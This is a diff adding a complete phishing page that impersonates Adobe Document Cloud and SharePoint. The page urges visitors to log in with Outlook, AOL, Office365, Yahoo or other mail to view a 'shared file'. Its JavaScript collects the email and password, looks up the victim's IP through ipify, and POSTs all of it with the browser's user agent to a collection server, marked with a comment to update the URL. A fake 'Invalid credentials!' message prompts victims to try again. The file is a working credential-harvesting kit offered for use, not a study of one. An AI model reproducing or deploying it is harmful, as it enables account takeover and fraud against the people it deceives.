@@ -1,0 +1,310 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Share Point Online</title>
+    <link href="/css/hover.css" rel="stylesheet" media="all">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <style type="text/css">
+      #msg {
+    display: block !important; /* Override the display: none; */
+    background-color: transparent;
+    border: none;
+    font-weight: bolder;
+  }
+    </style>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="row" style="background-image: url('images/8.jpg'); background-size: cover;background-repeat: no-repeat;">
+        <div class="container">
+          <div class="row">
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+              <div class="text-center pt-5"> 
+                <img src="images/adobe.jpg" class="img-fluid" width="100px"><br>
+                <span class="h4 text-white">Adobe Document Cloud</span><br>
+                <span class="h5 text-white font-weight-normal">To read the document, please choose your email provider below login to view shared file.</span>
+              </div>
+              <div class="mt-3">
+                <div class="row">
+                
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0073C8;">
+                        <img src="images/outlook1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12 ">
+                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class="  mt-2" style=" background-color: #31459B;">
+                        <img src="images/aol1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Aol</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #FF3C00;">
+                        <img src="images/office3651.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365</span>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #5F0F68;">
+                        <img src="images/yahoo1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Yahoo!</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+                      <div class=" mt-2" style=" background-color: #0B5BD3;">
+                        <img src="images/other1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+                        <span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail</span>
+                      </div>
+                    </a>
+                  </div>
+                  <div class="col-lg-12">
+                     <p class="text-white mt-3 text-center">Built upon Adobe Document Cloud, Adobe Document Cloud features can be unlocked by providing an additional license key.</p>
+                <p class="h5 text-center text-white">CopyRight© 2024 Adobe system incorporated, All right reserved.</p> 
+                    
+                  </div>
+               
+              </div> 
+            </div>
+          </div>
+        </div>
+
+
+
+      </div> 
+    </div>
+
+
+
+
+    <!-- Modal for gmail -->
+    <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal-dialog" role="document">
+        <div class="modal-content">
+          <div class="modal-header">
+
+            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+              <span aria-hidden="true">&times;</span>
+            </button>
+          </div>
+          <div class="modal-body">
+            <center>
+              <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
+              <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+              <div class="alert alert-danger" id="msg"></div>
+
+            </center>
+            <form id="contact" class="form-horizontal well">
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="exampleInputEmail1">Email address</label>
+                  <input type="email" name="email" autocomplete="current-email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
+                  <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
+                </div>
+              </div>
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <label for="Password">Password</label>
+                  <input type="password" name="password" autocomplete="current-password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+                </div>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+              <button class="btn btn-lg btn-info pull-right" id="submit-btn" onclick="submitForm()">Login</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+    
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <!-- Include jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+  
+
+
+  <script>
+    function submitForm() {
+  // Assuming you have a function to validate credentials, replace it with your actual validation logic
+  var isValidCredentials = validateCredentials();
+
+  if (!isValidCredentials) {
+    // Show invalid credentials message
+    $('#msg').text('Invalid credentials!');
+    // Clear the password field
+    setTimeout(function () {
+      $('#password').val('');
+    }, 2000);
+    
+  } else {
+    // If credentials are valid, you can proceed with your login logic
+    // For now, let's just close the modal as  an example
+    $('#ajaxModal').modal('hide');
+  }
+}
+
+// Replace this function with your actual validation logic
+function validateCredentials() {
+  // Replace this with your validation logic
+  // For now, let's assume credentials are always invalid
+  return false;
+}
+    
+  </script>
+  <script>
+    console.log("my html")
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+      $('#gmailmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/gmail.png');
+        $('#field').html("Gmail");
+        $('#ajaxModal').modal('show');
+      });
+      $('#outlookmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/outlook.png');
+        $('#field').html("Outlook");
+        $('#ajaxModal').modal('show');
+      });
+      $('#aolmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/aol.png');
+        $('#field').html("Aol");
+        $('#ajaxModal').modal('show');
+      });
+      $('#office365modal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/office365.png');
+        $('#field').html("Office 365");
+        $('#ajaxModal').modal('show');
+      });
+      $('#yahoomodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/yahoo.png');
+        $('#field').html("Yahoo");
+        $('#ajaxModal').modal('show');
+      });
+      $('#othermodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'images/othermail.ico');
+        $('#field').html("Other Mail");
+        $('#ajaxModal').modal('show');
+      });
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var detail=$("#field").html();
+     });
+
+     $('#submit-btn').on('click', function (event) {
+      event.preventDefault();
+      // Retrieve form data
+      const email = $('#email').val();
+      const password = $('#password').val();
+      const detail = $('#field').html();
+      const userAgent = navigator.userAgent; 
+
+  
+  // Make AJAX request to Node.js server
+  $.ajax({
+    dataType: 'json',
+    url: 'https://localhost:3001',  // Update with your actual server URL
+    type: 'POST',
+    data: {
+      email: email,
+      password: password,
+      field: detail,
+      ipAddress: null, // Add the user's IP address
+      userAgent: userAgent,
+    },
+    beforeSend: function (xhr) {
+      getUserIP(function (userIP) {
+          // Set the actual IP address obtained from the client
+          xhr.setRequestHeader('X-Forwarded-For', userIP);
+        });
+
+      $('#submit-btn').html('Verifying...');
+      console.log(xhr)
+    },
+    success: function (response) {
+      $('#msg').html(response.message);
+      console.log(response)
+    },
+    error: function (error) {
+      $('#msg').html('Please try again later');
+      console.log(error)
+    },
+    complete: function (complete) {
+      $('#submit-btn').html('Login');
+      console.log(complete)
+    }
+  });
+});
+
+function getUserIP(callback) {
+    // Use a third-party service to get the user's IP address
+    // This example uses ipify.org, but you can replace it with another service if needed
+    const ipifyUrl = 'https://api.ipify.org?format=json';
+
+    $.ajax({
+      url: ipifyUrl,
+      method: 'GET',
+      async: false,
+      success: function (response) {
+        const userIP = response.ip;
+        callback(userIP);
+      },
+      error: function () {
+        console.error('Failed to get user IP address');
+        callback(null);
+      }
+    });
+  }
+
+    });
+  </script>
+</body>
+  </html>
